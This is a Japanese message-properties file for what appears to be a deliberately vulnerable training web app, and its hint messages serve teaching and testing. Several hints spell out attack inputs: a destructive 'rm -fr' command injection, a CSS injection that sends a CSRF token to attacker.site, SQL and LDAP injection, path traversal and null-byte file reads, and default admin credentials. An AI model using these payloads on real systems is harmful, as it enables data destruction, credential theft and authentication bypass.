label.current.thread.count    = \u73FE\u5728\u306E\u30B9\u30EC\u30C3\u30C9\u6570
label.default                 = \u30C7\u30D5\u30A9\u30EB\u30C8
label.determine               = \u5224\u5B9A\u3059\u308B
label.edit.profile            = \u30D7\u30ED\u30D5\u30A3\u30FC\u30EB\u306E\u7DE8\u96C6
label.execution.result        = \u5B9F\u884C\u7D50\u679C: 
label.forum                   = \u63B2\u793A\u677F
label.go.to.main              = \u30E1\u30A4\u30F3\u30DA\u30FC\u30B8\u3078
label.goto.admin.page         = \u7BA1\u7406\u8005\u30E1\u30A4\u30F3\u30DA\u30FC\u30B8\u3078
label.history.back            = \u623B\u308B
label.ip.address              = IP\u30A2\u30C9\u30EC\u30B9
label.json.string             = JSON\u6587\u5B57\u5217
label.key                     = \u30AD\u30FC
label.language                = \u8A00\u8A9E
label.last.access.time        = \u6700\u7D42\u30A2\u30AF\u30BB\u30B9\u6570\u6642\u523B
label.login                   = \u30ED\u30B0\u30A4\u30F3
label.login.user.id           = \u30ED\u30B0\u30A4\u30F3\u30E6\u30FC\u30B6\u30FCID
label.logout                  = \u30ED\u30B0\u30A2\u30A6\u30C8
label.lowercase.characters    = \u534A\u89D2\u5C0F\u6587\u5B57
label.mail                    = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9
label.memory.collection.usage = \u30B3\u30EC\u30AF\u30B7\u30E7\u30F3\u4F7F\u7528\u91CF
label.memory.committed        = \u4FDD\u8A3C\u5024
label.memory.init             = \u521D\u671F\u5024
label.memory.max              = \u6700\u5927\u5024
label.memory.peak.usage       = \u30D4\u30FC\u30AF\u30E1\u30E2\u30EA\u30FC\u4F7F\u7528\u91CF
label.memory.usage            = \u30E1\u30E2\u30EA\u30FC\u4F7F\u7528\u91CF
label.memory.used             = \u73FE\u5728\u5024
label.metaspace               = Metaspace
label.name                    = \u540D\u524D
label.numbers                 = \u6570\u5B57
label.obelus                  = \u00F7
label.original.style          = \u72EC\u81EA\u30B9\u30BF\u30A4\u30EB
label.password                = \u30D1\u30B9\u30EF\u30FC\u30C9
label.permgen.space           = PermGen\u9818\u57DF
label.phone                   = \u96FB\u8A71\u756A\u53F7
label.ping.url                = Ping\u3059\u308BURL
label.platform                = \u30D7\u30E9\u30C3\u30C8\u30D5\u30A9\u30FC\u30E0
label.post                    = \u6295\u7A3F\u3059\u308B
label.response.code           = \u5FDC\u7B54\u30B3\u30FC\u30C9
label.response.time           = \u5FDC\u7B54\u6642\u9593
label.reversed.string         = \u9006\u8EE2\u3057\u305F\u6587\u5B57\u5217
label.secret                  = \u6697\u8A3C\u756A\u53F7
label.session.id              = \u30BB\u30C3\u30B7\u30E7\u30F3ID
label.signs                   = \u8A18\u53F7
label.string                  = \u6587\u5B57\u5217
label.subject                 = \u4EF6\u540D
label.submit                  = \u9001\u4FE1
label.times                   = \u56DE
label.timezone.id             = \u30BF\u30A4\u30E0\u30BE\u30FC\u30F3ID
label.timezone.name           = \u30BF\u30A4\u30E0\u30BE\u30FC\u30F3\u540D
label.timezone.offset         = \u30BF\u30A4\u30E0\u30BE\u30FC\u30F3\u30AA\u30D5\u30BB\u30C3\u30C8
label.update                  = \u66F4\u65B0
label.upload                  = \u30A2\u30C3\u30D7\u30ED\u30FC\u30C9
label.uppercase.characters    = \u534A\u89D2\u5927\u6587\u5B57
label.user.agent              = \u30E6\u30FC\u30B6\u30FC\u30A8\u30FC\u30B8\u30A7\u30F3\u30C8
label.user.id                 = \u30E6\u30FC\u30B6\u30FCID
label.value                   = \u5024
label.version                 = \u30D0\u30FC\u30B8\u30E7\u30F3
label.your.mail               = \u3042\u306A\u305F\u306E\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9
label.your.name               = \u3042\u306A\u305F\u306E\u540D\u524D

msg.account.locked                = \u30ED\u30B0\u30A4\u30F3\u9023\u7D9A\u5931\u6557\u56DE\u6570\u304C{0}\u56DE\u3092\u8D85\u3048\u305F\u305F\u3081\u3001\u30A2\u30AB\u30A6\u30F3\u30C8\u304C\u30ED\u30C3\u30AF\u3055\u308C\u3066\u3044\u307E\u3059\u3002
msg.add.users.by.xml              = \u6B21\u306E\u5F62\u5F0F\u306EXML\u30D5\u30A1\u30A4\u30EB\u3092\u30A2\u30C3\u30D7\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001\u30E6\u30FC\u30B6\u30FC\u304C\u4E00\u62EC\u3067\u767B\u9332\u3067\u304D\u307E\u3059\u3002
msg.admin.page.top                = \u7BA1\u7406\u8005\u30DA\u30FC\u30B8\u3078\u3088\u3046\u3053\u305D\uFF01\uFF01
msg.answer.is.correct             = \u6B63\u89E3\u3067\u3059\u3002
msg.authentication.fail           = \u8A8D\u8A3C\u306B\u5931\u6557\u3057\u307E\u3057\u305F\u3002\u518D\u5EA6\u30ED\u30B0\u30A4\u30F3\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.available.functions           = \u5229\u7528\u53EF\u80FD\u306A\u6A5F\u80FD\u306F\u4EE5\u4E0B\u3067\u3059\u3002
msg.batch.registration.complete   = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u767B\u9332\u304C\u5B8C\u4E86\u3057\u307E\u3057\u305F\u3002
msg.batch.registration.fail       = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u767B\u9332\u304C\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.batch.update.complete         = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u66F4\u65B0\u304C\u5B8C\u4E86\u3057\u307E\u3057\u305F\u3002
msg.batch.update.fail             = \u30E6\u30FC\u30B6\u30FC\u306E\u4E00\u62EC\u66F4\u65B0\u304C\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.calc.sym.natural.numbers      = n\u4EE5\u4E0B\u306E\u81EA\u7136\u6570\u3059\u3079\u3066\u306E\u7DCF\u548C (1 + 2 + 3 + \u2026 + n) \u3092\u8A08\u7B97\u3057\u307E\u3059\u3002
msg.cant.create.batch             = \u30D0\u30C3\u30C1\u30D5\u30A1\u30A4\u30EB\u3092\u4F5C\u6210\u3067\u304D\u307E\u305B\u3093\u3067\u3057\u305F\u3002
msg.convert.grayscale             = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u30B0\u30EC\u30FC\u30B9\u30B1\u30FC\u30EB\u5909\u63DB\u3092\u884C\u3046\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
msg.convert.grayscale.complete    = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u30B0\u30EC\u30FC\u30B9\u30B1\u30FC\u30EB\u5909\u63DB\u304C\u5B8C\u4E86\u3057\u307E\u3057\u305F\u3002
msg.convert.grayscale.fail        = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u306E\u30B0\u30EC\u30FC\u30B9\u30B1\u30FC\u30EB\u5909\u63DB\u306B\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.db.access.error.occur         = \u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u30A2\u30AF\u30BB\u30B9\u6642\u306B\u4F55\u3089\u304B\u306E\u30A8\u30E9\u30FC\u304C\u767A\u751F\u3057\u307E\u3057\u305F\u3002
msg.dead.lock.detected            = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u3092\u691C\u77E5\u3057\u307E\u3057\u305F\u3002
msg.dead.lock.not.occur           = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u306F\u767A\u751F\u3057\u3066\u3044\u307E\u305B\u3093\u3002
msg.deadlock.occurs               = \u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u306B\u3088\u308A\u30ED\u30C3\u30AF\u3092\u53D6\u5F97\u3067\u304D\u307E\u305B\u3093\u3067\u3057\u305F\u3002
msg.download.file                 = \u4EE5\u4E0B\u306EPDF\u30D5\u30A1\u30A4\u30EB\u304C\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9\u3067\u304D\u307E\u3059\u3002
msg.enter.decimal.value           = \u7D76\u5BFE\u5024\u304C1\u672A\u6E80\u306E\u5C0F\u6570\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.enter.json.string             = JSON\u6587\u5B57\u5217\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.enter.mail                    = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.enter.math.expression         = \u6570\u5F0F\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002\u6570\u5F0F\u306B\u306F<code>java.lang.Math</code>\u3092\u4F7F\u7528\u3059\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002\u4F8B)<code>Math.sqrt(Math.pow(2, 6)) - 5</code>
msg.enter.name                    = \u540D\u524D\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.enter.name.and.passwd         = \u540D\u524D\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6697\u8A3C\u756A\u53F7\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002
msg.enter.passwd                  = \u65B0\u3057\u3044\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u5909\u66F4\u3055\u308C\u307E\u3059\u3002
msg.enter.positive.number         = \u6B63\u306E\u6574\u6570\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.enter.string                  = \u6587\u5B57\u5217\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.error.user.not.exist          = \u30E6\u30FC\u30B6\u30FC\u304C\u5B58\u5728\u3057\u306A\u3044\u304B\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u4E00\u81F4\u3057\u307E\u305B\u3093\u3002
msg.executed.batch                = \u30D0\u30C3\u30C1\u3092\u4F5C\u6210\u3001\u5B9F\u884C\u3057\u307E\u3057\u305F: 
msg.invalid.expression            = \u4E0D\u6B63\u306A\u6570\u5F0F\u3067\u3059 : {0}
msg.invalid.json                  = \u4E0D\u6B63\u306AJSON\u6587\u5B57\u5217\u3067\u3059 : {0}
msg.is.leap.year                  = \u3046\u308B\u3046\u5E74\u3067\u3059\u3002
msg.is.not.leap.year              = \u3046\u308B\u3046\u5E74\u3067\u306F\u3042\u308A\u307E\u305B\u3093\u3002
msg.login.with.openid.provider    = \u6295\u7A3F\u3059\u308B\u306B\u306F\u30ED\u30B0\u30A4\u30F3\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.low.alphnum8                  = \u30D1\u30B9\u30EF\u30FC\u30C9\u306F8\u6841\u306E\u82F1\u6570\u5B57\u3067\u3059\u3002
msg.mail.change.failed            = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u306E\u5909\u66F4\u306B\u5931\u6557\u3057\u307E\u3057\u305F\u3002
msg.mail.changed                  = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u306F\u6B63\u5E38\u306B\u5909\u66F4\u3055\u308C\u307E\u3057\u305F\u3002
msg.mail.format.is.invalid        = \u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u306E\u5F62\u5F0F\u304C\u4E0D\u6B63\u3067\u3059\u3002
msg.mail.is.empty                 = \u4EF6\u540D\u3068\u672C\u6587\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.match.regular.expression      = \u5165\u529B\u6587\u5B57\u5217\u306F\u6B63\u898F\u8868\u73FE\u306B\u4E00\u81F4\u3057\u307E\u3057\u305F\u3002
msg.max.file.size.exceed          = \u30D5\u30A1\u30A4\u30EB\u30B5\u30A4\u30BA\u304C\u8A31\u5BB9\u9650\u5EA6\u3092\u8D85\u3048\u3066\u3044\u307E\u3059\u3002
msg.need.admin.privilege          = \u3053\u3053\u304B\u3089\u5148\u306F\u7BA1\u7406\u8005\u6A29\u9650\u304C\u5FC5\u8981\u3067\u3059\u3002\u30E6\u30FC\u30B6\u30FCID\u3068\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.not.image.file                = \u753B\u50CF\u30D5\u30A1\u30A4\u30EB\u3067\u306F\u3042\u308A\u307E\u305B\u3093\u3002
msg.not.match.regular.expression  = \u5165\u529B\u6587\u5B57\u5217\u306F\u6B63\u898F\u8868\u73FE\u306B\u4E00\u81F4\u3057\u307E\u305B\u3093\u3002
msg.not.xml.file                  = XML\u30D5\u30A1\u30A4\u30EB\u3067\u306F\u3042\u308A\u307E\u305B\u3093\u3002
msg.note.brute.force              = <code>admin</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002\u3053\u306E\u30DA\u30FC\u30B8\u306B\u306F\u30ED\u30B0\u30A4\u30F3\u8A66\u884C\u56DE\u6570\u306E\u5236\u9650\u304C\u7121\u3044\u305F\u3081\u3001\u30D6\u30EB\u30FC\u30C8\u30D5\u30A9\u30FC\u30B9\u653B\u6483\u304C\u53EF\u80FD\u3067\u3059\u3002
msg.note.clickjacking             = \u3053\u306E\u30DA\u30FC\u30B8\u306F\u3001\u30E6\u30FC\u30B6\u30FC\u304C\u610F\u56F3\u3057\u306A\u3044\u30EA\u30AF\u30A8\u30B9\u30C8\u3082\u53D7\u4FE1\u3057\u3066\u3001\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5909\u66F4\u3057\u3066\u3057\u307E\u3044\u307E\u3059\u3002
msg.note.clientinfo               ={0}\u306B\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3068\u3001\u305D\u306E\u30C7\u30A3\u30EC\u30AF\u30C8\u30EA\u5185\u306E\u30D5\u30A1\u30A4\u30EB\u4E00\u89A7\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002\u3055\u3089\u306B{1}\u306B\u8A18\u8F09\u3055\u308C\u305F\u30A2\u30AB\u30A6\u30F3\u30C8\u3067\u30ED\u30B0\u30A4\u30F3\u3059\u308B\u3068\u3001{2}\u3078\u30A2\u30AF\u30BB\u30B9\u3059\u308B\u3053\u3068\u304C\u3067\u304D\u307E\u3059\u3002
msg.note.codeinjection            = <code>{}');java.lang.System.exit(0);//</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30B3\u30FC\u30C9\u30A4\u30F3\u30B8\u30A7\u30AF\u30B7\u30E7\u30F3\u3067 JavaVM\u304C\u5F37\u5236\u7D42\u4E86\u3057\u307E\u3059\u3002
msg.note.commandinjection         = <code>@Runtime@getRuntime().exec('rm -fr /your-important-dir/')</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30B5\u30FC\u30D0\u30FC\u4E0A\u306E\u91CD\u8981\u306A\u30C7\u30A3\u30EC\u30AF\u30C8\u30EA\u304C\u524A\u9664\u3055\u308C\u307E\u3059\u3002
msg.note.createobjects            = \u5927\u304D\u306A\u6570\u5024\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u4E0D\u5FC5\u8981\u306A\u30AA\u30D6\u30B8\u30A7\u30AF\u30C8\u751F\u6210\u306B\u3088\u308A\u3001\u5FDC\u7B54\u306B\u6642\u9593\u304C\u304B\u304B\u308A\u307E\u3059\u3002
msg.note.csrf                     = \u3053\u306E\u30DA\u30FC\u30B8\u306F\u3001\u30E6\u30FC\u30B6\u30FC\u304C\u610F\u56F3\u3057\u306A\u3044\u30EA\u30AF\u30A8\u30B9\u30C8\u3082\u53D7\u4FE1\u3057\u3066\u3001\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5909\u66F4\u3057\u3066\u3057\u307E\u3044\u307E\u3059\u3002
msg.note.cssinjection             = \u4EE5\u4E0B\u306E\u3088\u3046\u306ACSS\u30D5\u30A1\u30A4\u30EB\u3092http://attacker.site/cssinjection.css\u306B\u914D\u7F6E\u3057\u3001\u30AF\u30A8\u30EA\u30B9\u30C8\u30EA\u30F3\u30B0\u306B<code>style=%40import%20url(%22http%3A%2F%2Fattacker.site%2Fcssinjection.css%22)%3B</code>\u3092\u4ED8\u52A0\u3059\u308B\u3068\u3001hidden\u306ECSRF\u30C8\u30FC\u30AF\u30F3\u306E1\u6587\u5B57\u76EE\u304Chttp://attacker.site/\u306B\u9001\u4FE1\u3055\u308C\u307E\u3059\u3002\u3053\u308C\u3092\u518D\u5E30\u7684\u306B\u5B9F\u884C\u3059\u308B\u30A2\u30D7\u30EA\u30B1\u30FC\u30B7\u30E7\u30F3\u3092http://attacker.site/\u306B\u914D\u5099\u3059\u308C\u3070\u3001CSRF\u30C8\u30FC\u30AF\u30F3\u3092\u53D6\u5F97\u3067\u304D\u307E\u3059\u3002\u3053\u306E\u554F\u984C\u306E\u518D\u73FE\u6027\u306F\u4F7F\u7528\u3059\u308B\u30D6\u30E9\u30A6\u30B6\u306B\u4F9D\u5B58\u3057\u307E\u3059\u3002
msg.note.dangerous.file.inclusion = \u30AF\u30A8\u30EA\u30B9\u30C8\u30EA\u30F3\u30B0\u3092<code>template=[\u60AA\u610F\u306E\u3042\u308BJSP\u30D5\u30A1\u30A4\u30EB\u304C\u30C7\u30D7\u30ED\u30A4\u3055\u308C\u305FURL]</code>\u306B\u5909\u66F4\u3059\u308B\u3068\u3001\u60AA\u610F\u306E\u3042\u308B\u30B3\u30FC\u30C9\u304C\u5B9F\u884C\u3055\u308C\u307E\u3059\u3002
msg.note.db.connection.leak.occur = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001\u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u30B3\u30CD\u30AF\u30B7\u30E7\u30F3\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.deadlock                 = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u9023\u7D9A\u3067\u6570\u56DE\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001\u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.deadlock2                = 2\u3064\u306E\u30A6\u30A4\u30F3\u30C9\u30A6\u307E\u305F\u306F\u30BF\u30D6\u3092\u958B\u304D\u3001\u4E00\u65B9\u3067\u30E6\u30FC\u30B6\u30FCID\u3092\u964D\u9806\u306B\u30BD\u30FC\u30C8\u3057\u3066\u300C\u66F4\u65B0\u300D\u30DC\u30BF\u30F3\u3092\u30AF\u30EA\u30C3\u30AF\u3057\u305F\u76F4\u5F8C\u306B\u3001\u3082\u3046\u4E00\u65B9\u3067\u6607\u9806\u306E\u307E\u307E\u300C\u66F4\u65B0\u300D\u30DC\u30BF\u30F3\u3092\u30AF\u30EA\u30C3\u30AF\u3059\u308B\u3068\u3001\u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u3067\u30C7\u30C3\u30C9\u30ED\u30C3\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.endlesswaiting           = \u5927\u304D\u306A\u6587\u5B57\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u5B8C\u4E86\u3057\u306A\u3044\u30D7\u30ED\u30BB\u30B9\u306E\u5F85\u6A5F\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.filedescriptorleak       = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001\u30D5\u30A1\u30A4\u30EB\u30C7\u30A3\u30B9\u30AF\u30EA\u30D7\u30BF\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.intoverflow              = 63\u4EE5\u4E0A\u306E\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6574\u6570\u30AA\u30FC\u30D0\u30FC\u30D5\u30ED\u30FC\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.ldap.injection           = <code>admin</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002<code>*)(|(objectClass=*</code>\u3001<code>aaaaaaa)</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u8A8D\u8A3C\u3092\u8FC2\u56DE\u3057\u3066\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002
msg.note.livelock                 = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u9023\u7D9A\u3067\u6570\u56DE\u30ED\u30FC\u30C9\u3059\u308B\u3068\u3001\u30E9\u30A4\u30D6\u30ED\u30C3\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.lossoftrailingdigits     = 0.0000000000000001\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u60C5\u5831\u6B20\u843D\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.mailheaderinjection      = \u30D6\u30E9\u30A6\u30B6\u306E\u958B\u767A\u8005\u30E2\u30FC\u30C9\u3067\u4EF6\u540D\u306Einput\u30BF\u30B0\u3092textarea\u30BF\u30B0\u306B\u5909\u66F4\u3057\u3001\u300C[\u4EFB\u610F\u4EF6\u540D][\u6539\u884C]Bcc: [\u4EFB\u610F\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9]\u300D\u3092\u5165\u529B\u3057\u3066\u9001\u4FE1\u3059\u308B\u3068\u3001[\u4EFB\u610F\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9]\u306B\u30E1\u30FC\u30EB\u3092\u9001\u4FE1\u3067\u304D\u307E\u3059\u3002
msg.note.memoryleak               = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001Java\u30D2\u30FC\u30D7\u9818\u57DF\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002\u753B\u9762\u3092\u30ED\u30FC\u30C9\u3057\u7D9A\u3051\u308B\u3068\u3001\u6700\u7D42\u7684\u306BOutOfMemoryError\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
msg.note.memoryleak3              = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001C\u30D2\u30FC\u30D7\u9818\u57DF\u306E\u30E1\u30E2\u30EA\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002\u753B\u9762\u3092\u30ED\u30FC\u30C9\u3057\u7D9A\u3051\u308B\u3068\u3001\u6700\u7D42\u7684\u306BOutOfMemoryError\u304C\u30B9\u30ED\u30FC\u3055\u308C\u307E\u3059\u3002
msg.note.mojibake                 = \u6587\u5B57\u5217\u306B\u65E5\u672C\u8A9E\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6587\u5B57\u5316\u3051\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.netsocketleak            = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001\u30CD\u30C3\u30C8\u30EF\u30FC\u30AF\u30BD\u30B1\u30C3\u30C8\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.not.use.ext.db           = \u30C7\u30FC\u30BF\u30D9\u30FC\u30B9\u30B3\u30CD\u30AF\u30B7\u30E7\u30F3\u30EA\u30FC\u30AF\u306F\u3001MySQL\u306A\u3069\u306E\u5916\u90E8RDBMS\u3092\u4F7F\u7528\u3059\u308B\u5834\u5408\u306B\u306E\u307F\u767A\u751F\u3057\u307E\u3059\u3002\u5916\u90E8RDBMS\u3092\u4F7F\u7528\u3059\u308B\u5834\u5408\u306F\u3001<code>application.properties</code>\u3092\u7DE8\u96C6\u3057\u3066\u4E0B\u3055\u3044\u3002
msg.note.nullbyteinjection        = \u30D0\u30FC\u30B8\u30E7\u30F31.7.0_40\u3088\u308A\u524D\u306EJava\u3092\u4F7F\u7528\u3057\u3066\u3044\u308B\u5834\u5408\u3001\u30AF\u30A8\u30EA\u30B9\u30C8\u30EA\u30F3\u30B0\u306B<code>fileName=../WEB-INF/web.xml%00</code>\u3092\u4ED8\u52A0\u3059\u308B\u3068\u3001web.xml\u306E\u5185\u5BB9\u3092\u542B\u3080\u30D5\u30A1\u30A4\u30EB\u304C\u30C0\u30A6\u30F3\u30ED\u30FC\u30C9\u3067\u304D\u307E\u3059\u3002
msg.note.oidc.invalid.config      = \u3053\u306E\u6A5F\u80FD\u3092\u4F7F\u7528\u3059\u308B\u306B\u306F\u3001<code>application.properties</code>\u306B\u9069\u5207\u306AOpenID Connect\u306E\u30D7\u30ED\u30D1\u30C6\u30A3\u30FC\u3092\u5B9A\u7FA9\u3059\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059\u3002
msg.note.open.redirect            = <code>admin</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002\u30AF\u30A8\u30EA\u30B9\u30C8\u30EA\u30F3\u30B0\u306B<code>goto=[\u60AA\u610F\u306E\u3042\u308B\u30B5\u30A4\u30C8\u306EURL]</code>\u3092\u4ED8\u52A0\u3059\u308B\u3068\u3001\u30C1\u30A7\u30C3\u30AF\u305B\u305A\u306B\u60AA\u610F\u306E\u3042\u308B\u30B5\u30A4\u30C8\u306EURL\u306B\u30EA\u30C0\u30A4\u30EC\u30AF\u30C8\u3057\u307E\u3059\u3002
msg.note.path.traversal           = \u30AF\u30A8\u30EA\u30B9\u30C8\u30EA\u30F3\u30B0\u3092<code>template=../uid/backup/adminpassword.txt?</code>\u306B\u5909\u66F4\u3059\u308B\u3068\u3001\u3053\u306E\u30DA\u30FC\u30B8\u306Badminpassword.txt\u306E\u5185\u5BB9\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002
msg.note.roundofferror            = 1\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u4E38\u3081\u8AA4\u5DEE\u304C\u767A\u751F\u3057\u307E\u3059\u3002
msg.note.session.fixation         = <code>admin</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u30ED\u30B0\u30A4\u30F3\u3067\u304D\u307E\u3059\u3002\u3053\u306E\u30DA\u30FC\u30B8\u3067\u306FCookie\u3092\u6271\u3048\u306A\u3044\u30AF\u30E9\u30A4\u30A2\u30F3\u30C8\u3092\u30B5\u30DD\u30FC\u30C8\u3059\u308B\u76EE\u7684\u3067URL\u30EA\u30E9\u30A4\u30C8\u304C\u6A5F\u80FD\u3057\u307E\u3059\u3002\u305D\u308C\u306B\u3088\u308A\u3001\u30BB\u30C3\u30B7\u30E7\u30F3\u56FA\u5B9A\u653B\u6483\u304C\u53EF\u80FD\u3068\u306A\u3063\u3066\u3044\u307E\u3059\u3002
msg.note.slowregex                = \u6587\u5B57\u5217\u306B<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u3042</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u69CB\u6587\u89E3\u6790\u306B\u6570\u5341\u79D2\u304B\u308A\u307E\u3059\u3002<br>&nbsp;\u6587\u5B57\u5217\u306B<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u3042</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u5FDC\u7B54\u304C\u8FD4\u3089\u306A\u304F\u306A\u308A\u307E\u3059\u3002
msg.note.sqlijc                   = <code>Mark</code>\u3068<code>password</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6697\u8A3C\u756A\u53F7\u304C\u8868\u793A\u3055\u308C\u307E\u3059\u3002\u30D1\u30B9\u30EF\u30FC\u30C9\u306B<code>' OR '1'='1</code>\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u4ED6\u306E\u30E6\u30FC\u30B6\u30FC\u306E\u60C5\u5831\u304C\u8868\u793A\u3067\u304D\u307E\u3059\u3002
msg.note.strplusopr               = +(\u30D7\u30E9\u30B9)\u6F14\u7B97\u5B50\u3067\u6587\u5B57\u5217\u3092\u9023\u7D50\u3057\u3066\u3044\u308B\u305F\u3081\u3001\u5927\u304D\u306A\u6587\u5B57\u6570\u3092\u5165\u529B\u3059\u308B\u3068\u3001\u6587\u5B57\u5217\u751F\u6210\u306B\u6570\u5341\u79D2\u304B\u308A\u307E\u3059\u3002
msg.note.threadleak               = \u3053\u306E\u30DA\u30FC\u30B8\u3092\u8AAD\u307F\u8FBC\u3080\u305F\u3073\u306B\u3001\u30B9\u30EC\u30C3\u30C9\u30EA\u30FC\u30AF\u304C\u767A\u751F\u3057\u307E\u3059\u3002
